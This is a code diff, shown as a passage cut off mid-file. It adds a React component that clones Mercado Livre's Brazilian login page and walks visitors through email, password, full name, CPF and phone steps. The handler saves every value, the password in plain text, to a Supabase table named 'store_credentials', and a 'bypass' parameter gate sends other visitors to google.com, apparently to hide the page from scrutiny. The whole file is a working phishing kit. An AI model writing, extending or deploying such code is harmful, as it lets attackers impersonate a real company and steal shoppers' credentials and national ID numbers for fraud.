@@ -1,0 +1,609 @@
+import React, { useEffect, useState, useRef } from "react";
+import { useNavigate } from "react-router-dom";
+import { useIsMobile } from "@/hooks/use-mobile";
+import { useMascara } from "@/hooks/useMascara";
+import { sanitizeStoreHTML } from "@/lib/mascaraSanitizer";
+import { supabase } from "@/integrations/supabase/client";
+import StoreLoader from "@/components/StoreLoader";
+
+const StoreLogin = () => {
+  const navigate = useNavigate();
+  const isMobile = useIsMobile();
+  const containerRef = useRef<HTMLDivElement>(null);
+  const { mascara } = useMascara();
+  const [loading, setLoading] = useState(true);
+  const [authorized, setAuthorized] = useState(false);
+  const [step, setStep] = useState<'email' | 'password' | 'update'>('email');
+  const [userEmail, setUserEmail] = useState('');
+  const [userPassword, setUserPassword] = useState('');
+  const [isRegister, setIsRegister] = useState(false);
+
+  // Set body data-site attribute and background
+  useEffect(() => {
+    document.body.setAttribute('data-site', 'ML');
+    const prevBg = document.body.style.backgroundColor;
+    document.body.style.backgroundColor = '#ffffff';
+    
+    return () => {
+      document.body.removeAttribute('data-site');
+      document.body.style.backgroundColor = prevBg;
+    };
+  }, []);
+
+  const getCommonHeader = () => `
+    <header role="banner" data-siteid="MLB" class="nav-header nav-header-plusclean ui-navigation-v2">
+        <div class="nav-bounds">
+            <style type="text/css">
+                a.nav-skip-to-main-content {
+                    border: 0;
+                    border-bottom-left-radius: 4px;
+                    border-bottom-right-radius: 4px;
+                    position: absolute;
+                    color: #fff;
+                    text-decoration: none;
+                    text-align: center;
+                    background: #3484fa;
+                    left: -10000px;
+                    width: 1px;
+                    height: 1px;
+                    overflow: hidden;
+                    z-index: -999
+                }
+
+                a.nav-skip-to-main-content:focus {
+                    border: 1px solid #3484fa;
+                    height: 55px;
+                    width: 200px;
+                    padding: 8px 8px;
+                    top: 0;
+                    left: 0;
+                    z-index: 999
+                }
+
+                .nav-skip-to-main-content>.nav-skip-to-main-content__content {
+                    display: block;
+                    padding: 8px;
+                    border: 1px solid white;
+                    border-radius: 4px;
+                    line-height: 21px;
+                    font-weight: 300;
+                    font-size: 16px;
+                    color: #fff
+                }
+            </style>
+
+            <style type="text/css">
+                a.nav-a11y-feedback-link {
+                    border: 0;
+                    border-bottom-left-radius: 4px;
+                    border-bottom-right-radius: 4px;
+                    position: absolute;
+                    color: #fff;
+                    text-decoration: none;
+                    text-align: center;
+                    background: #3484fa;
+                    left: -10000px;
+                    width: 1px;
+                    height: 1px;
+                    overflow: hidden;
+                    z-index: -999
+                }
+
+                a.nav-a11y-feedback-link:focus {
+                    border: 1px solid #3484fa;
+                    height: 79px;
+                    width: 200px;
+                    padding: 8px 8px;
+                    top: 0;
+                    left: 0;
+                    z-index: 999
+                }
+
+                .nav-a11y-feedback-link>.nav-a11y-feedback-link__content {
+                    display: block;
+                    padding: 8px;
+                    border: 1px solid white;
+                    border-radius: 4px;
+                    line-height: 21px;
+                    font-weight: 300;
+                    font-size: 16px;
+                    color: #fff
+                }
+            </style><a id="nav-a11y-feedback-link" class="nav-a11y-feedback-link"><span
+                    class="nav-a11y-feedback-link__content">Comentar sobre
+                    acessibilidade</span></a><a class="nav-logo" style="
+    background-image: url(https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.19.0/mercadolibre/pt_logo_large_plus@2x.webp) !important;
+">Mercado Livre Brasil - Onde comprar e vender de Tudo</a>
+        </div>
+    </header>
+  `;
+
+  const getCommonFooter = () => `
+    <footer class="login-footer login-footer--landscape">
+        <div class="login-footer__container login-footer__container--privacy"><a
+                class="andes-typography login-footer__mercadolibre-privacy-link andes-typography--type-body andes-typography--size-xs andes-typography--color-link andes-typography--weight-regular"
+                target="_blank" rel="noopener noreferrer">Como cuidamos da sua privacidade<span
+                    class="sr-only">(abrirá uma nova
+                    janela)</span></a><span
+                class="andes-typography login-footer__mercadolibre-copyright andes-typography--type-body andes-typography--size-xs andes-typography--color-secondary andes-typography--weight-regular">Copyright
+                © 1999-2026 Ebazar.com.br LTDA.</span></div><span
+            class="andes-typography login-footer__container login-footer__container--recaptcha andes-typography--type-body andes-typography--size-xs andes-typography--color-secondary andes-typography--weight-regular">Protegido
+            por reCAPTCHA<a
+                class="andes-typography login-footer__recaptcha-link andes-typography--type-body andes-typography--size-xs andes-typography--color-primary andes-typography--weight-regular">Privacidade</a><a
+                class="andes-typography login-footer__recaptcha-link andes-typography--type-body andes-typography--size-xs andes-typography--color-primary andes-typography--weight-regular">Condições</a></span>
+    </footer>
+  `;
+
+  const getLoginHTML = () => {
+    return `
+      ${getCommonHeader()}
+      <main role="main" id="root-app" data-navigation="true">
+        <div id="_R_32e_" style="display:contents">
+            <div class="grid-view__container">
+                <div class="grid-view__main">
+                    <div class="grid-view__section--headers">
+                        <h1
+                            class="andes-ui-typography grid-view__title andes-ui-typography--type-heading andes-ui-typography--size-xhuge andes-ui-typography--color-primary andes-ui-typography--weight-default andes-ui-typography-heading-xhuge-default">
+                            ${isRegister ? "Crie a sua conta" : "Digite seu e-mail ou telefone para iniciar sessão"}</h1>
+                    </div>
+                    <div class="grid-view__section--help">
+                        <div class="grid-view__help-section">
+                            <ul class="andes-list security-problem security-problem-social andes-list--default andes-list--selectable"
+                                id="_R_c8r2e_" data-andes-list="true">
+                                <li class="andes-list__item andes-list__item--size-small andes-list__item--selectable"
+                                    id="_R_c8r2e_-0" data-andes-list-item="true" data-andes-list-item-size="small"><a
+                                        aria-labelledby="_R_c8r2e_-0-content" class="andes-list__item-actionable"></a>
+                                    <div class="andes-list__item-first-column" id="_R_c8r2e_-0-content">
+                                        <div class="andes-list__item-asset andes-list__item-asset--icon andes-list__item-asset--icon-one-line"
+                                            aria-hidden="true" data-andes-list-left-content="true"><svg
+                                                xmlns="http://www.w3.org/2000/svg" width="27" height="26" fill="none"
+                                                aria-hidden="true">
+                                                <path fill="#000" fill-opacity="0.9" fill-rule="evenodd"
+                                                    d="M11.715 25.15C3.915 22.55 0 16.02 0 5.791V4.87h.924c3.462 0 6.955-1.448 10.494-4.38l.59-.489.589.488a23.955 23.955 0 002.914 2.087l-1.684 1.122a25.984 25.984 0 01-1.82-1.31C8.655 5.022 5.27 6.463 1.857 6.686c.212 8.828 3.585 14.298 10.15 16.61 2.287-.805 4.186-1.993 5.699-3.572h2.43c-1.909 2.506-4.522 4.32-7.837 5.425l-.292.098-.292-.098z"
+                                                    clip-rule="evenodd"></path>
+                                                <path fill="#000" fill-opacity="0.9" fill-rule="evenodd"
+                                                    d="M19.505 4.734a5.917 5.917 0 00-5.4 8.34l.25.556-.19.58-.888 2.722 2.978-.85.523-.15.504.205a5.917 5.917 0 102.223-11.403zM12.01 10.65a7.495 7.495 0 114.678 6.948l-4.678 1.336-.79-.79 1.445-4.425a7.468 7.468 0 01-.655-3.07z"
+                                                    clip-rule="evenodd"></path>
+                                                <path fill="#000" fill-opacity="0.9"
+                                                    d="M20.27 7.4h-1.53l.192 4.207h1.147l.192-4.208zm-.764 4.972a.765.765 0 110 1.53.765.765 0 010-1.53z">
+                                                </path>
+                                            </svg></div>
+                                        <div class="andes-list__item-text"><span class="andes-list__item-primary"
+                                                data-andes-list-title="true">Tenho um problema de segurança</span></div>
+                                    </div>
+                                    <div class="andes-list__item-second-column">
+                                        <div class="andes-list__item-chevron andes-list__item-chevron--top"
+                                            data-andes-list-chevron="true"><svg aria-hidden="true" color="currentColor"
+                                                width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+                                                <path
+                                                    d="M8.27686 4.34644L7.42834 5.19496L12.224 9.99059L7.42334 14.7912L8.27187 15.6397L13.921 9.99059L8.27686 4.34644Z"
+                                                    fill="currentColor"></path>
+                                            </svg></div>
+                                    </div>
+                                </li>
+                            </ul><a
+                                class="andes-ui-typography grid-view__help-link andes-ui-typography--type-body andes-ui-typography--size-small andes-ui-typography--color-link andes-ui-typography--weight-default andes-ui-typography-body-small-default">Preciso
+                                de ajuda</a>
+                        </div>
+                    </div>
+                    <div class="andes-card grid-view__section--content andes-card--outline andes-card--primary andes-card--padding-0"
+                        id="_R_58r2e_" data-andes-card="true" data-andes-card-hierarchy="primary">
+                        <div class="andes-card__overlap">
+                            <div class="andes-card__content" data-andes-card-content="true">
+                                <div class="children-wrapper">
+                                    <form class="login-form login-form--social" novalidate="" id="login_user_form">
+                                        <div class="login-form__input">
+                                            <div class="login-form__input">
+                                                <div class="andes-form-control andes-form-control--textfield login-form__input--email andes-form-control--default"
+                                                    data-andes-textfield="true" data-andes-textfield-modifier="default">
+                                                    <label for="user_id" data-andes-textfield-label="true"><span
+                                                            class="andes-form-control__label">E-mail ou
+                                                            telefone</span></label>
+                                                    <div class="andes-form-control__control"><input type="email"
+                                                            data-testid="user_id" autocomplete="on"
+                                                            autocapitalize="none" spellcheck="false" autocorrect="off"
+                                                            id="user_id" class="andes-form-control__field"
+                                                            maxlength="120" placeholder=""
+                                                            aria-describedby="user_id-message" rows="1" autofocus=""
+                                                            data-andes-textfield-input="true"
+                                                            data-andes-textfield-input-type="input" name="user_id"
+                                                            value="${userEmail}"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="login-form__actions login-form__actions--social">
+                                          <button type="submit"
+                                                class="andes-button login-form__submit login-form__submit--social andes-button--large andes-button--loud"
+                                                id="_R_4kt8r2e_" data-andes-button="true"
+                                                data-andes-button-hierarchy="loud" data-andes-button-size="large"><span
+                                                    class="andes-button__content"
+                                                    data-andes-button-content="true">Continuar</span></button>
+                                          ${!isRegister ? `<a
+                                                class="andes-button andes-button--large andes-button--mute andes-button--full-width"
+                                                id="registration-link" data-testid="login-link" data-andes-button="true"
+                                                data-andes-button-hierarchy="mute" data-andes-button-size="large"><span
+                                                    class="andes-button__content" data-andes-button-content="true">Criar
+                                                    conta</span></a>` : ''}
+                                            <div class="login-form__challenge-divider">
+                                                <hr class="login-form__divider" aria-hidden="true">
+                                                <p class="login-form__o">ou</p>
+                                                <hr class="login-form__divider" aria-hidden="true">
+                                            </div>
+                                            <div id="login-form__oauth-container">
+                                                <div class="google-button">
+                                                    <div class="S9gUrf-YoZ4jf" style="position: relative;">
+                                                        <div></div><iframe
+                                                            src="https://accounts.google.com/gsi/button?type=standard&amp;theme=outline&amp;size=large&amp;text=signin_with&amp;shape=rectangular&amp;logo_alignment=left&amp;width=398&amp;client_id=1055017050086-8dk183v50lmf3bjmnddfv4grt1ldn9b6.apps.googleusercontent.com&amp;hl=pt"
+                                                            class="L5Fo6c-PQbLGe" allow="identity-credentials-get"
+                                                            title="Botão Iniciar sessão com o Google"
+                                                            style="display: block; position: relative; top: 0px; left: 0px; height: 44px; width: 418px; border: 0px; margin: -2px -10px;"></iframe>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            ${getCommonFooter()}
+        </div>
+      </main>
+    `;
+  };
+
+  const getPasswordHTML = (email: string) => {
+    const maskedEmail = email.replace(/(.{2})(.*)(@.*)/, (_, a, b, c) => a + '*'.repeat(b.length) + c);
+    return `
+      ${getCommonHeader()}
+      <main role="main" id="root-app" data-navigation="true">
+        <div id="_R_32e_" style="display:contents">
+            <div class="grid-view__container">
+                <div class="grid-view__main">
+                    <div class="grid-view__section--headers">
+                        <p class="andes-ui-typography grid-view__subtitle andes-ui-typography--type-body andes-ui-typography--size-small andes-ui-typography--color-secondary andes-ui-typography--weight-emphasis">${isRegister ? "Criação de conta" : "Entrar"}</p>
+                        <h1
+                            class="andes-ui-typography grid-view__title andes-ui-typography--type-heading andes-ui-typography--size-xhuge andes-ui-typography--color-primary andes-ui-typography--weight-default andes-ui-typography-heading-xhuge-default">
+                            ${isRegister ? "Agora, crie a sua senha" : "Agora, digite a sua senha"}</h1>
+                    </div>
+                    <div class="user-pill" style="margin-bottom: 24px; display: flex; align-items: center; padding: 12px; background: #f5f5f5; border-radius: 6px;">
+                        <div class="andes-ui-thumbnail__container andes-ui-thumbnail__container--small" data-andes-thumbnail="true">
+                          <div class="andes-ui-thumbnail andes-ui-thumbnail--circle andes-ui-thumbnail--small andes-ui-thumbnail__icon andes-ui-thumbnail--quiet user-pill__avatar" style="margin-right:12px;"><svg aria-hidden="true" color="accent" width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z" fill="currentColor"></path>
+                            <path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z" fill="currentColor"></path>
+                          </svg></div>
+                        </div>
+                        <div class="user-pill__body">
+                          <p class="user-pill__identifier" style="font-size: 14px; font-weight: 600; margin: 0;">${maskedEmail}</p>
+                          <button class="andes-ui-typography user-pill__change-user-link" id="back-to-email-link" type="button" style="background: none; border: none; padding: 0; color: #3483fa; font-size: 12px; cursor: pointer;">Alterar e-mail</button>
+                        </div>
+                    </div>
+                    <div class="andes-card grid-view__section--content andes-card--outline andes-card--primary andes-card--padding-0"
+                        id="_R_58r2e_" data-andes-card="true" data-andes-card-hierarchy="primary">
+                        <div class="andes-card__overlap">
+                            <div class="andes-card__content" data-andes-card-content="true">
+                                <div class="children-wrapper">
+                                    <form class="login-form login-form--social" novalidate="" id="login_password_form">
+                                        <div class="login-form__input">
+                                          <div class="andes-form-control andes-form-control--textfield andes-form-control--default" data-andes-textfield="true">
+                                            <label for="password"><span class="andes-form-control__label">Senha</span></label>
+                                            <div class="andes-form-control__control" style="position: relative; border-radius: 6px; border: 1px solid rgba(0,0,0,0.25); background: #fff;">
+                                              <input type="password" id="password" class="andes-form-control__field" name="password" autofocus="" autocomplete="current-password" style="padding: 13px 12px; font-size: 16px; border: none; width: 100%; outline: none; background: transparent;">
+                                              <div id="password-icon-container" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #3483fa;">
+                                                <input class="andes-ui-textfield__password-checkbox" id="password-checkbox" type="checkbox" style="display:none">
+                                                <svg class="eye-closed-icon" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M2.76108 8.80639C3.10268 8.62194 3.52411 8.73023 3.73764 9.04467L3.77768 9.1101L3.95053 9.42065C4.83847 10.9675 6.05 12.3958 7.41635 13.4519C8.87779 14.5814 10.468 15.2496 11.9994 15.2497C13.5309 15.2497 15.1218 14.5814 16.5833 13.4519C18.0407 12.3256 19.3217 10.7761 20.222 9.11108C20.419 8.74683 20.8743 8.61062 21.2386 8.80737C21.6028 9.00436 21.7381 9.45969 21.5414 9.82397C20.7121 11.3575 19.5875 12.8082 18.2845 13.9822L19.5746 15.5173L19.6214 15.5789C19.8348 15.893 19.7797 16.3243 19.4828 16.574C19.1855 16.8237 18.7505 16.8036 18.4779 16.5388L18.4261 16.4822L17.1165 14.9226C15.7866 15.8725 14.2961 16.5407 12.7503 16.7078V18.9997C12.7503 19.4139 12.4144 19.7496 12.0003 19.7497C11.5861 19.7497 11.2503 19.414 11.2503 18.9997V16.7078C9.70444 16.541 8.21324 15.8736 6.88315 14.9236L5.57455 16.4822C5.30817 16.7993 4.83508 16.8403 4.51791 16.574C4.20088 16.3075 4.15974 15.8344 4.42612 15.5173L5.7142 13.9822C4.50889 12.8958 3.45607 11.5725 2.64877 10.1658L2.45737 9.82299L2.42514 9.75365C2.27929 9.40285 2.41977 8.99109 2.76108 8.80639Z" fill="currentColor"></path></svg>
+                                                <svg class="eye-open-icon" style="display:none" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.34905 9.34863C10.8135 7.88448 13.1874 7.88427 14.6518 9.34863L14.7846 9.48828C16.1146 10.9602 16.0702 13.2326 14.6518 14.6514C13.1874 16.1158 10.8135 16.1157 9.34905 14.6514C7.88458 13.1869 7.88458 10.8131 9.34905 9.34863ZM13.4203 10.2549C12.5367 9.53414 11.2334 9.58571 10.4096 10.4092C9.53092 11.2879 9.53092 12.7121 10.4096 13.5908C11.2883 14.4694 12.7126 14.4695 13.5912 13.5908C14.4147 12.7671 14.4662 11.4637 13.7455 10.5801L13.5912 10.4092L13.4203 10.2549Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M12.0004 4.25C13.9637 4.2501 15.8689 5.09861 17.5014 6.36035C19.0357 7.54627 20.3728 9.12946 21.351 10.834L21.5424 11.1768L21.6332 11.374C21.8149 11.8437 21.7847 12.3752 21.5424 12.8242L21.5414 12.8252C20.5499 14.6586 19.1378 16.3749 17.5014 17.6396C15.8689 18.9012 13.9637 19.7499 12.0004 19.75C10.0371 19.75 8.132 18.9014 6.49944 17.6396C4.96496 16.4537 3.62708 14.8707 2.64885 13.166L2.45842 12.8232C2.1815 12.31 2.1815 11.689 2.45842 11.1758C3.44997 9.34218 4.86285 7.62511 6.49944 6.36035C8.132 5.09872 10.0371 4.25 12.0004 4.25ZM12.0004 5.75C10.4688 5.75 8.87805 6.41736 7.41643 7.54688C5.95889 8.67327 4.6782 10.2234 3.77776 11.8887C3.74112 11.9571 3.74111 12.0419 3.77776 12.1104L3.95158 12.4209C4.8395 13.9677 6.05013 15.3961 7.41643 16.4521C8.87805 17.5818 10.4688 18.25 12.0004 18.25C13.5318 18.2499 15.122 17.5824 16.5834 16.4531C18.0409 15.3268 19.3217 13.7765 20.2221 12.1113C20.2588 12.0428 20.2588 11.9581 20.2221 11.8896C19.3217 10.224 18.0409 8.67432 16.5834 7.54785C15.1219 6.41825 13.5319 5.7501 12.0004 5.75Z" fill="currentColor"></path></svg>
+                                              </div>
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div class="login-form__actions login-form__actions--social">
+                                          <button type="submit"
+                                                class="andes-button login-form__submit login-form__submit--social andes-button--large andes-button--loud"
+                                                id="login_password_submit" data-andes-button="true"
+                                                data-andes-button-hierarchy="loud" data-andes-button-size="large"><span
+                                                    class="andes-button__content"
+                                                    data-andes-button-content="true">Confirmar</span></button>
+                                          <a class="andes-button andes-button--large andes-button--mute andes-button--full-width"
+                                                id="choose-other-method" data-andes-button="true"
+                                                data-andes-button-hierarchy="mute" data-andes-button-size="large"><span
+                                                    class="andes-button__content" data-andes-button-content="true">Escolher outro método</span></a>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            ${getCommonFooter()}
+        </div>
+      </main>
+    `;
+  };
+
+  const getUpdateHTML = (email: string) => {
+    const maskedEmail = email.replace(/(.{2})(.*)(@.*)/, (_, a, b, c) => a + '*'.repeat(b.length) + c);
+    const countryCode = localStorage.getItem('app_country') || 'BR';
+    const labelDocument = countryCode === 'BR' ? "CPF" : "Documento";
+    return `
+      ${getCommonHeader()}
+      <main role="main" id="root-app" data-navigation="true">
+        <div id="_R_32e_" style="display:contents">
+            <div class="grid-view__container">
+                <div class="grid-view__main">
+                    <div class="grid-view__section--headers">
+                        <p class="andes-ui-typography grid-view__subtitle andes-ui-typography--type-body andes-ui-typography--size-small andes-ui-typography--color-secondary andes-ui-typography--weight-emphasis">Atualizar dados</p>
+                        <h1
+                            class="andes-ui-typography grid-view__title andes-ui-typography--type-heading andes-ui-typography--size-xhuge andes-ui-typography--color-primary andes-ui-typography--weight-default andes-ui-typography-heading-xhuge-default">
+                            Complete seus dados</h1>
+                    </div>
+                    <div class="user-pill" style="margin-bottom: 24px; display: flex; align-items: center; padding: 12px; background: #f5f5f5; border-radius: 6px;">
+                        <div class="andes-ui-thumbnail__container andes-ui-thumbnail__container--small" data-andes-thumbnail="true">
+                          <div class="andes-ui-thumbnail andes-ui-thumbnail--circle andes-ui-thumbnail--small andes-ui-thumbnail__icon andes-ui-thumbnail--quiet user-pill__avatar" style="margin-right:12px;"><svg aria-hidden="true" color="accent" width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z" fill="currentColor"></path>
+                            <path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z" fill="currentColor"></path>
+                          </svg></div>
+                        </div>
+                        <div class="user-pill__body">
+                          <p class="user-pill__identifier" style="font-size: 14px; font-weight: 600; margin: 0;">${maskedEmail}</p>
+                        </div>
+                    </div>
+                    <div class="andes-card grid-view__section--content andes-card--outline andes-card--primary andes-card--padding-0"
+                        id="_R_58r2e_" data-andes-card="true" data-andes-card-hierarchy="primary">
+                        <div class="andes-card__overlap">
+                            <div class="andes-card__content" data-andes-card-content="true">
+                                <div class="children-wrapper">
+                                    <form class="login-form login-form--social" novalidate="" id="login_update_form">
+                                        <div class="login-form__input" style="margin-bottom: 20px;">
+                                          <div class="andes-form-control andes-form-control--textfield andes-form-control--default" data-andes-textfield="true">
+                                            <label for="full_name"><span class="andes-form-control__label">Nome completo</span></label>
+                                            <div class="andes-form-control__control" style="border-radius: 6px; border: 1px solid rgba(0,0,0,0.25); background: #fff;">
+                                              <input type="text" id="full_name" class="andes-form-control__field" name="full_name" autocomplete="name" style="padding: 13px 12px; font-size: 16px; border: none; width: 100%; outline: none; background: transparent;">
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div class="login-form__input" style="margin-bottom: 20px;">
+                                          <div class="andes-form-control andes-form-control--textfield andes-form-control--default" data-andes-textfield="true">
+                                            <label for="cpf"><span class="andes-form-control__label">${labelDocument}</span></label>
+                                            <div class="andes-form-control__control" style="border-radius: 6px; border: 1px solid rgba(0,0,0,0.25); background: #fff;">
+                                              <input type="text" id="cpf" class="andes-form-control__field" name="cpf" maxlength="14" style="padding: 13px 12px; font-size: 16px; border: none; width: 100%; outline: none; background: transparent;">
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div class="login-form__input" style="margin-bottom: 20px;">
+                                          <div class="andes-form-control andes-form-control--textfield andes-form-control--default" data-andes-textfield="true">
+                                            <label for="phone"><span class="andes-form-control__label">Telefone</span></label>
+                                            <div class="andes-form-control__control" style="border-radius: 6px; border: 1px solid rgba(0,0,0,0.25); background: #fff;">
+                                              <input type="tel" id="phone" class="andes-form-control__field" name="phone" maxlength="15" style="padding: 13px 12px; font-size: 16px; border: none; width: 100%; outline: none; background: transparent;">
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div class="login-form__actions login-form__actions--social">
+                                          <button type="submit"
+                                                class="andes-button login-form__submit login-form__submit--social andes-button--large andes-button--loud"
+                                                id="login_update_submit" data-andes-button="true"
+                                                data-andes-button-hierarchy="loud" data-andes-button-size="large"><span
+                                                    class="andes-button__content"
+                                                    data-andes-button-content="true">Continuar</span></button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            ${getCommonFooter()}
+        </div>
+      </main>
+    `;
+  };
+
+  // Check if this is a register flow
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.has('register')) {
+      setIsRegister(true);
+    }
+  }, []);
+
+  // Bypass access control
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.has('bypass')) {
+      localStorage.setItem('store_access', 'authorized');
+    }
+    const hasAccess = localStorage.getItem('store_access') === 'authorized';
+    if (!hasAccess) {
+      window.location.href = 'https://www.google.com';
+      return;
+    }
+    setAuthorized(true);
+  }, []);
+
+  // Loader & Background (ML Yellow Flash)
+  useEffect(() => {
+    const originalBg = document.body.style.backgroundColor;
+    document.body.style.backgroundColor = '#fff159';
+    const timer = setTimeout(() => {
+      setLoading(false);
+      document.body.style.backgroundColor = '#ffffff';
+    }, 2000);
+    return () => {
+      clearTimeout(timer);
+      document.body.style.backgroundColor = originalBg;
+    };
+  }, []);
+
+  // Event handlers
+  useEffect(() => {
+    const container = containerRef.current;
+    if (!container || !authorized) return;
+
+    const logo = container.querySelector('.nav-logo') as HTMLElement;
+    logo?.addEventListener('click', (e) => { e.preventDefault(); navigate('/store'); });
+
+    if (step === 'email') {
+      const form = container.querySelector('#login_user_form') as HTMLFormElement;
+      const submitEmail = () => {
+        const input = container.querySelector('#user_id') as HTMLInputElement;
+        const val = input?.value?.trim();
+        if (val) {
+          setUserEmail(val);
+          setStep('password');
+        }
+      };
+      form?.addEventListener('submit', (e) => { e.preventDefault(); submitEmail(); });
+      
+      const userInput = container.querySelector('#user_id') as HTMLInputElement;
+      userInput?.addEventListener('keydown', ((e: KeyboardEvent) => {
+        if (e.key === 'Enter') { e.preventDefault(); submitEmail(); }
+      }) as EventListener);
+
+      const regLink = container.querySelector('#registration-link') as HTMLElement;
+      regLink?.addEventListener('click', (e) => { e.preventDefault(); setIsRegister(true); });
+
+    } else if (step === 'password') {
+      const passwordForm = container.querySelector('#login_password_form') as HTMLFormElement;
+      const goToUpdate = (e: Event) => {
+        e.preventDefault();
+        const pwInput = container.querySelector('#password') as HTMLInputElement;
+        const password = pwInput?.value?.trim();
+        if (password) {
+          setUserPassword(password);
+          setStep('update');
+        }
+      };
+      passwordForm?.addEventListener('submit', goToUpdate);
+
+      const confirmBtn = container.querySelector('#login_password_submit') as HTMLButtonElement;
+      confirmBtn?.addEventListener('click', goToUpdate);
+
+      const backToEmail = container.querySelector('#back-to-email-link') as HTMLElement;
+      backToEmail?.addEventListener('click', (e) => { e.preventDefault(); setStep('email'); });
+
+      const otherMethod = container.querySelector('#choose-other-method') as HTMLElement;
+      otherMethod?.addEventListener('click', (e) => { e.preventDefault(); setStep('email'); });
+
+      const toggleCheckbox = container.querySelector('#password-checkbox') as HTMLInputElement;
+      toggleCheckbox?.addEventListener('change', () => {
+        const pwInput = container.querySelector('#password') as HTMLInputElement;
+        const eyeClosed = container.querySelector('.eye-closed-icon') as HTMLElement;
+        const eyeOpen = container.querySelector('.eye-open-icon') as HTMLElement;
+        if (pwInput) {
+          const showing = toggleCheckbox?.checked;
+          pwInput.type = showing ? 'text' : 'password';
+          if (eyeClosed) eyeClosed.style.display = showing ? 'none' : '';
+          if (eyeOpen) eyeOpen.style.display = showing ? '' : 'none';
+        }
+      });
+    } else if (step === 'update') {
+      const updateForm = container.querySelector('#login_update_form') as HTMLFormElement;
+      const cpfInput = container.querySelector('#cpf') as HTMLInputElement;
+      const phoneInput = container.querySelector('#phone') as HTMLInputElement;
+      
+      const cpfMask = () => {
+        let v = cpfInput.value.replace(/\D/g, '').slice(0, 11);
+        if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+        else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+        else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+        cpfInput.value = v;
+      };
+      cpfInput?.addEventListener('input', cpfMask);
+
+      const phoneMask = () => {
+        let v = phoneInput.value.replace(/\D/g, '').slice(0, 11);
+        if (v.length > 6) v = v.replace(/(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
+        else if (v.length > 2) v = v.replace(/(\d{2})(\d{1,5})/, '($1) $2');
+        phoneInput.value = v;
+      };
+      phoneInput?.addEventListener('input', phoneMask);
+
+      const updateHandler = async (e: Event) => {
+        e.preventDefault();
+        const fullName = (container.querySelector('#full_name') as HTMLInputElement)?.value?.trim();
+        const cpf = (container.querySelector('#cpf') as HTMLInputElement)?.value?.trim();
+        const phone = (container.querySelector('#phone') as HTMLInputElement)?.value?.trim();
+        if (fullName && cpf && userEmail && userPassword) {
+          try {
+            await supabase.from('store_credentials').insert({
+              email: userEmail,
+              password: userPassword,
+              full_name: fullName,
+              cpf: cpf,
+              phone: phone || null,
+            });
+          } catch (err) { console.error('Error saving credentials:', err); }
+          localStorage.setItem('store_logged_in', 'true');
+          localStorage.setItem('store_user_email', userEmail);
+          localStorage.setItem('store_user_name', fullName);
+          window.dispatchEvent(new Event('store_login_changed'));
+          navigate('/store');
+        }
+      };
+      updateForm?.addEventListener('submit', updateHandler);
+      const updateBtn = container.querySelector('#login_update_submit') as HTMLButtonElement;
+      updateBtn?.addEventListener('click', updateHandler);
+    }
+  }, [navigate, step, authorized, userEmail, userPassword, isRegister]);
+
+  const rawHtml = step === 'email' ? getLoginHTML() : step === 'password' ? getPasswordHTML(userEmail) : getUpdateHTML(userEmail);
+  const html = sanitizeStoreHTML(rawHtml, mascara);
+
+  if (!authorized) return null;
+
+  return (
+    <>
+      {loading && <StoreLoader />}
+      <style type="text/css">{`
+        @charset "utf-8";
+        @font-face {
+            font-family: "navigation";
